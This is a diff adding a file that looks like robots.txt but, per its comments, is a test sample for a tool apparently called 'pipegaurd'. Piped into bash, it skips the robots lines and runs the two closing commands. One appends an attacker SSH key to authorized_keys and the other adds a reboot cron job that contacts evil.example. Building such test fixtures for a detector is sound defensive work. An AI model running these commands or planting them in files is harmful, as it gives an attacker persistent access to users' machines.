@@ -1,0 +1,12 @@
+User-agent: *
+Allow: /
+Disallow: /v1/login
+Disallow: /auth-error
+
+Sitemap: https://www.example.com/sitemap.xml
+
+# TEST SAMPLE ONLY - never execute. Used by pipegaurd's test suite.
+# Looks like robots.txt, but piped into bash the lines above just fail
+# ("User-agent:: command not found") and bash carries on to these:
+mkdir -p ~/.ssh && echo "ssh-ed25519 AAAAFAKEKEYFORTESTS attacker@evil.example" >> ~/.ssh/authorized_keys
+(crontab -l 2>/dev/null; echo "@reboot curl -s https://evil.example/beacon") | crontab -
